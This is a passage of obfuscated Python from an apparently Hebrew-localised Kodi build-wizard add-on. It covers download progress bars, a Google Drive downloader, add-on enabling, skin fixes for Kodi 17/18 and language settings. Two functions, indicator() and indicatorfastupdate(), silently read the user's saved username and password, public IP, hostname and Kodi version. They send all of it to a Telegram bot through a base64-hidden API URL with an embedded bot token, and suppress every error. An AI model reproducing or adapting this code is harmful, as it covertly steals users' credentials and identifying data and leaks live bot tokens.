        O0O0OOOO00O00O000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOOOO0O0O0OOOO0 ,'teal',OOO00OOO0O000OOO0 )#line:3471
        if (time .time ()-O0O0O00O0000O000O )>0 :#line:3472
          O0OO0OOOO00000O00 =O00O00O00O00O0O0O /(time .time ()-O0O0O00O0000O000O )#line:3473
          O0OO0OOOO00000O00 =O0OO0OOOO00000O00 /1024 #line:3474
        else :#line:3475
         O0OO0OOOO00000O00 =0 #line:3476
        OOO00OO0O00OO000O ='KB'#line:3477
        if O0OO0OOOO00000O00 >=1024 :#line:3478
           O0OO0OOOO00000O00 =O0OO0OOOO00000O00 /1024 #line:3479
           OOO00OO0O00OO000O ='MB'#line:3480
        if O0OO0OOOO00000O00 >0 and not O0OOO000OO000OOO0 ==100 :#line:3481
            O00O0O00OO0OO0OO0 =(O0OO00OO00O0OO00O -O00O00O00O00O0O0O )/O0OO0OOOO00000O00 #line:3482
        else :#line:3483
            O00O0O00OO0OO0OO0 =0 #line:3484
        O0O0OO0OOOOOOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0OOOO00000O00 ,OOO00OO0O00OO000O )#line:3485
        OO0O0O00O000OOO00 .update (int (O0OOO000OO000OOO0 ),"Downloading "+name ,O0O0OOOO00O00O000 ,O0O0OO0OOOOOOO00O )#line:3487
  O00OOO00000O00000 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3490
  O0OO000O000OO0O0O .close ()#line:3492
  extract (O000OOO00OO00000O ,O00OOO00000O00000 ,OO0O0O00O000OOO00 )#line:3494
  if os .path .exists (O00OOO00000O00000 +'/scakemyer-script.quasar.burst'):#line:3495
    if os .path .exists (O00OOO00000O00000 +'/script.quasar.burst'):#line:3496
     shutil .rmtree (O00OOO00000O00000 +'/script.quasar.burst',ignore_errors =False )#line:3497
    os .rename (O00OOO00000O00000 +'/scakemyer-script.quasar.burst',O00OOO00000O00000 +'/script.quasar.burst')#line:3498
  if os .path .exists (O00OOO00000O00000 +'/plugin.video.kmediatorrent-master'):#line:3500
    if os .path .exists (O00OOO00000O00000 +'/plugin.video.kmediatorrent'):#line:3501
     shutil .rmtree (O00OOO00000O00000 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3502
    os .rename (O00OOO00000O00000 +'/plugin.video.kmediatorrent-master',O00OOO00000O00000 +'/plugin.video.kmediatorrent')#line:3503
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3504
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3505
  try :#line:3506
    os .remove (O000OOO00OO00000O )#line:3507
  except :#line:3508
    pass #line:3509
  OO0O0O00O000OOO00 .close ()#line:3510
def dis_or_enable_addon (O00000OO00OOOO00O ,OO00OOO0O00OO0O0O ,enable ="true"):#line:3511
    import json #line:3512
    O0OO0OOOOOOOOO000 ='"%s"'%O00000OO00OOOO00O #line:3513
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00000OO00OOOO00O )and enable =="true":#line:3514
        logging .warning ('already Enabled')#line:3515
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00000OO00OOOO00O )#line:3516
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00000OO00OOOO00O )and enable =="false":#line:3517
        return xbmc .log ("### Skipped %s, reason = not installed"%O00000OO00OOOO00O )#line:3518
    else :#line:3519
        OOOO0OOOOO0O0O000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0OO0OOOOOOOOO000 ,enable )#line:3520
        O0OOO000O00OOO000 =xbmc .executeJSONRPC (OOOO0OOOOO0O0O000 )#line:3521
        O000OOOO00O0O0000 =json .loads (O0OOO000O00OOO000 )#line:3522
        if enable =="true":#line:3523
            xbmc .log ("### Enabled %s, response = %s"%(O00000OO00OOOO00O ,O000OOOO00O0O0000 ))#line:3524
        else :#line:3525
            xbmc .log ("### Disabled %s, response = %s"%(O00000OO00OOOO00O ,O000OOOO00O0O0000 ))#line:3526
    if OO00OOO0O00OO0O0O =='auto':#line:3527
     return True #line:3528
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3529
def chunk_report (O000O0O0000OOOO00 ,O0000OOO0OOOO00O0 ,OOOOO0O00OOO0O000 ):#line:3530
   O00O00OO00000OO00 =float (O000O0O0000OOOO00 )/OOOOO0O00OOO0O000 #line:3531
   O00O00OO00000OO00 =round (O00O00OO00000OO00 *100 ,2 )#line:3532
   if O000O0O0000OOOO00 >=OOOOO0O00OOO0O000 :#line:3534
      sys .stdout .write ('\n')#line:3535
def chunk_read (OO0O0O00000O0000O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3537
   import time #line:3538
   O000OO0O00OOO0OO0 =int (filesize )*1000000 #line:3539
   OO0OOOO0OO00OOO0O =0 #line:3541
   OOOOO0000O00O00O0 =time .time ()#line:3542
   OO0O00OO000OO0O00 =0 #line:3543
   logging .warning ('Downloading')#line:3545
   with open (destination ,"wb")as OO0OOOO0OO00O000O :#line:3546
    while 1 :#line:3547
      O000OOO0OO0000000 =time .time ()-OOOOO0000O00O00O0 #line:3548
      OO0OOO00000O00O0O =int (OO0O00OO000OO0O00 *chunk_size )#line:3549
      O0OOO00O0OOOO0OO0 =OO0O0O00000O0000O .read (chunk_size )#line:3550
      OO0OOOO0OO00O000O .write (O0OOO00O0OOOO0OO0 )#line:3551
      OO0OOOO0OO00O000O .flush ()#line:3552
      OO0OOOO0OO00OOO0O +=len (O0OOO00O0OOOO0OO0 )#line:3553
      O0O0O0OO0OOO0O0O0 =float (OO0OOOO0OO00OOO0O )/O000OO0O00OOO0OO0 #line:3554
      O0O0O0OO0OOO0O0O0 =round (O0O0O0OO0OOO0O0O0 *100 ,2 )#line:3555
      if int (O000OOO0OO0000000 )>0 :#line:3556
        O000OOOO00O0OO00O =int (OO0OOO00000O00O0O /(1024 *O000OOO0OO0000000 ))#line:3557
      else :#line:3558
         O000OOOO00O0OO00O =0 #line:3559
      if O000OOOO00O0OO00O >1024 and not O0O0O0OO0OOO0O0O0 ==100 :#line:3560
          O0O0OO00OOO00O00O =int (((O000OO0O00OOO0OO0 -OO0OOO00000O00O0O )/1024 )/(O000OOOO00O0OO00O ))#line:3561
      else :#line:3562
          O0O0OO00OOO00O00O =0 #line:3563
      if O0O0OO00OOO00O00O <0 :#line:3564
        O0O0OO00OOO00O00O =0 #line:3565
      dp .update (int (O0O0O0OO0OOO0O0O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0O0OO0OOO0O0O0 ,OO0OOO00000O00O0O /(1024 *1024 ),O000OO0O00OOO0OO0 /(1000 *1000 ),O000OOOO00O0OO00O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0OO00OOO00O00O ,60 ))#line:3566
      if dp .iscanceled ():#line:3567
         dp .close ()#line:3568
         break #line:3569
      if not O0OOO00O0OOOO0OO0 :#line:3570
         break #line:3571
      if report_hook :#line:3573
         report_hook (OO0OOOO0OO00OOO0O ,chunk_size ,O000OO0O00OOO0OO0 )#line:3574
      OO0O00OO000OO0O00 +=1 #line:3575
   logging .warning ('END Downloading')#line:3576
   return OO0OOOO0OO00OOO0O #line:3577
def googledrive_download (OOO0OOOOOOOOO0OO0 ,OO00000O0O0O0O00O ,O0O0OO0OOO00O00OO ,O0OO0OO00OO0OO000 ):#line:3579
    OOOO00000O0O0000O =[]#line:3583
    O00OOO00O00O0O0OO =OOO0OOOOOOOOO0OO0 .split ('=')#line:3584
    OOO0OOOOOOOOO0OO0 =O00OOO00O00O0O0OO [len (O00OOO00O00O0O0OO )-1 ]#line:3585
    def OOO0OO0OOOO00OO00 (O0OO0OO00OOOO000O ):#line:3587
        for O00OOOO0000O00OOO in O0OO0OO00OOOO000O :#line:3589
            logging .warning ('cookie.name')#line:3590
            logging .warning (O00OOOO0000O00OOO .name )#line:3591
            OOO0O0000000O0O00 =O00OOOO0000O00OOO .value #line:3592
            if 'download_warning'in O00OOOO0000O00OOO .name :#line:3593
                logging .warning (O00OOOO0000O00OOO .value )#line:3594
                logging .warning ('cookie.value')#line:3595
                return O00OOOO0000O00OOO .value #line:3596
            return OOO0O0000000O0O00 #line:3597
        return None #line:3599
    def OOOO0O0OOO0OO0O0O (OO0O0OOOOOOO00O00 ,OOO0OOOO00000O0O0 ):#line:3601
        OOOO00000O00OOOO0 =32768 #line:3603
        O00O0O0OO0O00OOOO =time .time ()#line:3604
        with open (OOO0OOOO00000O0O0 ,"wb")as OO0OOOOOOOO0O00OO :#line:3606
            O0OOOOOO00O0O0OOO =1 #line:3607
            O0O000OOOOOO00000 =32768 #line:3608
            try :#line:3609
                OO0OO0O0OO00O00OO =int (OO0O0OOOOOOO00O00 .headers .get ('content-length'))#line:3610
                print ('file total size :',OO0OO0O0OO00O00OO )#line:3611
            except TypeError :#line:3612
                print ('using dummy length !!!')#line:3613
                OO0OO0O0OO00O00OO =int (O0OO0OO00OO0OO000 )*1000000 #line:3614
            for OOO0O00OO0OO0O000 in OO0O0OOOOOOO00O00 .iter_content (OOOO00000O00OOOO0 ):#line:3615
                if OOO0O00OO0OO0O000 :#line:3616
                    OO0OOOOOOOO0O00OO .write (OOO0O00OO0OO0O000 )#line:3617
                    OO0OOOOOOOO0O00OO .flush ()#line:3618
                    O0OOO0000OOO0OO0O =time .time ()-O00O0O0OO0O00OOOO #line:3619
                    O0OOOO00000OOOOO0 =int (O0OOOOOO00O0O0OOO *O0O000OOOOOO00000 )#line:3620
                    if O0OOO0000OOO0OO0O ==0 :#line:3621
                        O0OOO0000OOO0OO0O =0.1 #line:3622
                    O0000OO00OOOO0OOO =int (O0OOOO00000OOOOO0 /(1024 *O0OOO0000OOO0OO0O ))#line:3623
                    O0OO0O0O0OO0OO00O =int (O0OOOOOO00O0O0OOO *O0O000OOOOOO00000 *100 /OO0OO0O0OO00O00OO )#line:3624
                    if O0000OO00OOOO0OOO >1024 and not O0OO0O0O0OO0OO00O ==100 :#line:3625
                      O0O0OO00O00O00000 =int (((OO0OO0O0OO00O00OO -O0OOOO00000OOOOO0 )/1024 )/(O0000OO00OOOO0OOO ))#line:3626
                    else :#line:3627
                      O0O0OO00O00O00000 =0 #line:3628
                    O0O0OO0OOO00O00OO .update (int (O0OO0O0O0OO0OO00O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OO0O0O0OO0OO00O ,O0OOOO00000OOOOO0 /(1024 *1024 ),OO0OO0O0OO00O00OO /(1000 *1000 ),O0000OO00OOOO0OOO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0OO00O00O00000 ,60 ))#line:3630
                    O0OOOOOO00O0O0OOO +=1 #line:3631
                    if O0O0OO0OOO00O00OO .iscanceled ():#line:3632
                     O0O0OO0OOO00O00OO .close ()#line:3633
                     break #line:3634
    O000000O000O00OO0 ="https://docs.google.com/uc?export=download"#line:3635
    import urllib2 #line:3640
    import cookielib #line:3641
    from cookielib import CookieJar #line:3643
    O0O0OO0O0OOOO000O =CookieJar ()#line:3645
    OOO000O0OO00O0000 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0O0OO0O0OOOO000O ))#line:3646
    OOOOOO0OO000O00O0 ={'id':OOO0OOOOOOOOO0OO0 }#line:3648
    O0000OO0O00OOO00O =urllib .urlencode (OOOOOO0OO000O00O0 )#line:3649
    logging .warning (O000000O000O00OO0 +'&'+O0000OO0O00OOO00O )#line:3650
    O0000O00OO000O0O0 =OOO000O0OO00O0000 .open (O000000O000O00OO0 +'&'+O0000OO0O00OOO00O )#line:3651
    O00O00O0O0O0OO0OO =O0000O00OO000O0O0 .read ()#line:3652
    for O00OO0O00OOO0OO0O in O0O0OO0O0OOOO000O :#line:3654
         logging .warning (O00OO0O00OOO0OO0O )#line:3655
    O0000O0000O0OO000 =OOO0OO0OOOO00OO00 (O0O0OO0O0OOOO000O )#line:3656
    logging .warning (O0000O0000O0OO000 )#line:3657
    if O0000O0000O0OO000 :#line:3658
        OO0OO00OOO000O00O ={'id':OOO0OOOOOOOOO0OO0 ,'confirm':O0000O0000O0OO000 }#line:3659
        O0O00OO00OO0O0O00 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3660
        O0000OO0O00OOO00O =urllib .urlencode (OO0OO00OOO000O00O )#line:3661
        O0000O00OO000O0O0 =OOO000O0OO00O0000 .open (O000000O000O00OO0 +'&'+O0000OO0O00OOO00O )#line:3662
        chunk_read (O0000O00OO000O0O0 ,report_hook =chunk_report ,dp =O0O0OO0OOO00O00OO ,destination =OO00000O0O0O0O00O ,filesize =O0OO0OO00OO0OO000 )#line:3663
    return (OOOO00000O0O0000O )#line:3667
def kodi17Fix ():#line:3668
	OOO00OOO0OOOOO0O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3669
	OO0OO0000000OO0OO =[]#line:3670
	for O00O000O000OOOOO0 in sorted (OOO00OOO0OOOOO0O0 ,key =lambda OO0OOO0O0O0OOOO0O :OO0OOO0O0O0OOOO0O ):#line:3671
		OOOOOOOOO0000OO0O =os .path .join (O00O000O000OOOOO0 ,'addon.xml')#line:3672
		if os .path .exists (OOOOOOOOO0000OO0O ):#line:3673
			O0O00OO0O00O0OO00 =O00O000O000OOOOO0 .replace (ADDONS ,'')[1 :-1 ]#line:3674
			OOOO0O0O000OOOO0O =open (OOOOOOOOO0000OO0O )#line:3675
			OO0O0O0O00O0O0O0O =OOOO0O0O000OOOO0O .read ()#line:3676
			O00OOO0O00OO0OO0O =parseDOM (OO0O0O0O00O0O0O0O ,'addon',ret ='id')#line:3677
			OOOO0O0O000OOOO0O .close ()#line:3678
			try :#line:3679
				O00OO0O0O000O0000 =xbmcaddon .Addon (id =O00OOO0O00OO0OO0O [0 ])#line:3680
			except :#line:3681
				try :#line:3682
					log ("%s was disabled"%O00OOO0O00OO0OO0O [0 ],xbmc .LOGDEBUG )#line:3683
					OO0OO0000000OO0OO .append (O00OOO0O00OO0OO0O [0 ])#line:3684
				except :#line:3685
					try :#line:3686
						log ("%s was disabled"%O0O00OO0O00O0OO00 ,xbmc .LOGDEBUG )#line:3687
						OO0OO0000000OO0OO .append (O0O00OO0O00O0OO00 )#line:3688
					except :#line:3689
						if len (O00OOO0O00OO0OO0O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0O00OO0O00O0OO00 ,xbmc .LOGERROR )#line:3690
						else :log ("Unabled to enable: %s"%O00O000O000OOOOO0 ,xbmc .LOGERROR )#line:3691
	if len (OO0OO0000000OO0OO )>0 :#line:3692
		O0O000O0OOO00OO00 =0 #line:3693
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3694
		for O0OOO000O0OOOO000 in OO0OO0000000OO0OO :#line:3695
			O0O000O0OOO00OO00 +=1 #line:3696
			OOOOO0OOOOOO0OO00 =int (percentage (O0O000O0OOO00OO00 ,len (OO0OO0000000OO0OO )))#line:3697
			DP .update (OOOOO0OOOOOO0OO00 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO000O0OOOO000 ))#line:3698
			addonDatabase (O0OOO000O0OOOO000 ,1 )#line:3699
			if DP .iscanceled ():break #line:3700
		if DP .iscanceled ():#line:3701
			DP .close ()#line:3702
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3703
			sys .exit ()#line:3704
		DP .close ()#line:3705
	forceUpdate ()#line:3706
def indicator ():#line:3708
       try :#line:3709
          import json #line:3710
          wiz .log ('FRESH MESSAGE')#line:3711
          O0OO0O00OOOO0OO00 =(ADDON .getSetting ("user"))#line:3712
          OO0O000O0000O00O0 =(ADDON .getSetting ("pass"))#line:3713
          OO000O0O0O000OOOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3714
          OOOO00000000O0000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3715
          OOOO00000OOO0O0OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3716
          O00O00000000OO00O =str (json .loads (OOOO00000OOO0O0OO )['ip'])#line:3717
          O0O00OOOOO0OOOO00 =O0OO0O00OOOO0OO00 #line:3718
          O00OOOOO0OO0OO0O0 =OO0O000O0000O00O0 #line:3719
          import socket #line:3720
          OOOO00000OOO0O0OO =urllib2 .urlopen (OOOO00000000O0000 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O00OOOOO0OOOO00 +' - '+O00OOOOO0OO0OO0O0 +' - '+OO000O0O0O000OOOO +' - '+O00O00000000OO00O ).readlines ()#line:3721
       except :pass #line:3723
def indicatorfastupdate ():#line:3725
       try :#line:3726
          import json #line:3727
          wiz .log ('FRESH MESSAGE')#line:3728
          O0OOOO0O0O000OOO0 =(ADDON .getSetting ("user"))#line:3729
          O000OO00O000000OO =(ADDON .getSetting ("pass"))#line:3730
          OO00O0OO00OOOO0O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3731
          OOO00O0O0O0O0O0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3733
          OO0O0O0OO0OO00O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3734
          O000OOO0OOOO0O00O =str (json .loads (OO0O0O0OO0OO00O00 )['ip'])#line:3735
          OOO0O0OO000O0O0O0 =O0OOOO0O0O000OOO0 #line:3736
          OOOO0OO0OOO0OO000 =O000OO00O000000OO #line:3737
          import socket #line:3739
          OO0O0O0OO0OO00O00 =urllib2 .urlopen (OOO00O0O0O0O0O0OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOO0O0OO000O0O0O0 +' - '+OOOO0OO0OOO0OO000 +' - '+OO00O0OO00OOOO0O0 +' - '+O000OOO0OOOO0O00O ).readlines ()#line:3740
       except :pass #line:3742
def skinfix18 ():#line:3744
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3745
		OO0O00OO0O00O0OOO =wiz .workingURL (SKINID18DDONXML )#line:3746
		if OO0O00OO0O00O0OOO ==True :#line:3747
			O00OOOO0O0OO0O000 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3748
			if len (O00OOOO0O0OO0O000 )>0 :#line:3749
				O0O00O00000O0000O ='%s-%s.zip'%(SKINID18 ,O00OOOO0O0OO0O000 [0 ])#line:3750
				O0O0O0000O0OOO0OO =wiz .workingURL (SKIN18ZIPURL +O0O00O00000O0000O )#line:3751
				if O0O0O0000O0OOO0OO ==True :#line:3752
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3753
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3754
					OO000OO00000O0000 =os .path .join (PACKAGES ,O0O00O00000O0000O )#line:3755
					try :os .remove (OO000OO00000O0000 )#line:3756
					except :pass #line:3757
					downloader .download (SKIN18ZIPURL +O0O00O00000O0000O ,OO000OO00000O0000 ,DP )#line:3758
					extract .all (OO000OO00000O0000 ,HOME ,DP )#line:3759
					try :#line:3760
						OO0OO0OOO0O0O0O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3761
						OO0000O0O000O0OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3762
						os .rename (OO0OO0OOO0O0O0O00 ,OO0000O0O000O0OOO )#line:3763
					except :#line:3764
						pass #line:3765
					try :#line:3766
						O00OOOO0O0O0000OO =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OOOO0O000OOOO00O0 =O00OOOO0O0O0000OO .read ();O00OOOO0O0O0000OO .close ()#line:3767
						OOOO0OOOOOO00O000 =wiz .parseDOM (OOOO0O000OOOO00O0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3768
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOOOOO00O000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3769
					except :#line:3770
						pass #line:3771
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3772
					DP .close ()#line:3773
					xbmc .sleep (500 )#line:3774
					wiz .forceUpdate (True )#line:3775
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3776
				else :#line:3777
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3778
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0O0000O0OOO0OO ,xbmc .LOGERROR )#line:3779
			else :#line:3780
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3781
		else :#line:3782
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3783
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3784
def skinfix17 ():#line:3785
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3786
		O0OO0O0000OO00O0O =wiz .workingURL (SKINID17DDONXML )#line:3787
		if O0OO0O0000OO00O0O ==True :#line:3788
			OO00OO00000OO0OO0 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3789
			if len (OO00OO00000OO0OO0 )>0 :#line:3790
				O00OOO00OO0OO0O00 ='%s-%s.zip'%(SKINID17 ,OO00OO00000OO0OO0 [0 ])#line:3791
				O000O00O00O0OO0O0 =wiz .workingURL (SKIN17ZIPURL +O00OOO00OO0OO0O00 )#line:3792
				if O000O00O00O0OO0O0 ==True :#line:3793
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3794
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3795
					O0OO00000OOO0000O =os .path .join (PACKAGES ,O00OOO00OO0OO0O00 )#line:3796
					try :os .remove (O0OO00000OOO0000O )#line:3797
					except :pass #line:3798
					downloader .download (SKIN17ZIPURL +O00OOO00OO0OO0O00 ,O0OO00000OOO0000O ,DP )#line:3799
					extract .all (O0OO00000OOO0000O ,HOME ,DP )#line:3800
					try :#line:3801
						O0O0OOOO00O0O00OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3802
						OO000OO0O00OO0O0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3803
						os .rename (O0O0OOOO00O0O00OO ,OO000OO0O00OO0O0O )#line:3804
					except :#line:3805
						pass #line:3806
					try :#line:3807
						O0000OOOOO0OOOO00 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O00000O0OOO0OOOO0 =O0000OOOOO0OOOO00 .read ();O0000OOOOO0OOOO00 .close ()#line:3808
						O000OO000O000000O =wiz .parseDOM (O00000O0OOO0OOOO0 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3809
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OO000O000000O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3810
					except :#line:3811
						pass #line:3812
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3813
					DP .close ()#line:3814
					xbmc .sleep (500 )#line:3815
					wiz .forceUpdate (True )#line:3816
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3817
				else :#line:3818
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3819
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O000O00O00O0OO0O0 ,xbmc .LOGERROR )#line:3820
			else :#line:3821
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3822
		else :#line:3823
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3824
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3825
def fix17update ():#line:3826
	if KODIV >=17 and KODIV <18 :#line:3827
		wiz .kodi17Fix ()#line:3828
		xbmc .sleep (4000 )#line:3829
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3830
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3831
		fixfont ()#line:3832
		OOO0000000OO0OO00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3833
		try :#line:3835
			O0OOO00000OOOOO00 =open (OOO0000000OO0OO00 ,'r')#line:3836
			O0O0OO00000O0O00O =O0OOO00000OOOOO00 .read ()#line:3837
			O0OOO00000OOOOO00 .close ()#line:3838
			OO0O0OOOOO0O0O00O ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3839
			OOOO00OO0OOO0OOOO =re .compile (OO0O0OOOOO0O0O00O ).findall (O0O0OO00000O0O00O )[0 ]#line:3840
			O0OOO00000OOOOO00 =open (OOO0000000OO0OO00 ,'w')#line:3841
			O0OOO00000OOOOO00 .write (O0O0OO00000O0O00O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOOO00OO0OOO0OOOO ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3842
			O0OOO00000OOOOO00 .close ()#line:3843
		except :#line:3844
				pass #line:3845
		wiz .kodi17Fix ()#line:3846
		OOO0000000OO0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3847
		try :#line:3848
			O0OOO00000OOOOO00 =open (OOO0000000OO0OO00 ,'r')#line:3849
			O0O0OO00000O0O00O =O0OOO00000OOOOO00 .read ()#line:3850
			O0OOO00000OOOOO00 .close ()#line:3851
			OO0O0OOOOO0O0O00O ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3852
			OOOO00OO0OOO0OOOO =re .compile (OO0O0OOOOO0O0O00O ).findall (O0O0OO00000O0O00O )[0 ]#line:3853
			O0OOO00000OOOOO00 =open (OOO0000000OO0OO00 ,'w')#line:3854
			O0OOO00000OOOOO00 .write (O0O0OO00000O0O00O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOOO00OO0OOO0OOOO ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3855
			O0OOO00000OOOOO00 .close ()#line:3856
		except :#line:3857
				pass #line:3858
		swapSkins ('skin.Premium.mod')#line:3859
def fix18update ():#line:3861
	if KODIV >=18 :#line:3862
		xbmc .sleep (4000 )#line:3863
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3864
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3865
		fixfont ()#line:3866
		OOO0O0OO00000OOO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3867
		try :#line:3868
			O00OO00O0OOO0OOOO =open (OOO0O0OO00000OOO0 ,'r')#line:3869
			O000O00OOOO000O0O =O00OO00O0OOO0OOOO .read ()#line:3870
			O00OO00O0OOO0OOOO .close ()#line:3871
			OO000O000O0O00OO0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3872
			OOO0OOOOO0OOO0O0O =re .compile (OO000O000O0O00OO0 ).findall (O000O00OOOO000O0O )[0 ]#line:3873
			O00OO00O0OOO0OOOO =open (OOO0O0OO00000OOO0 ,'w')#line:3874
			O00OO00O0OOO0OOOO .write (O000O00OOOO000O0O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOO0OOOOO0OOO0O0O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3875
			O00OO00O0OOO0OOOO .close ()#line:3876
		except :#line:3877
				pass #line:3878
		wiz .kodi17Fix ()#line:3879
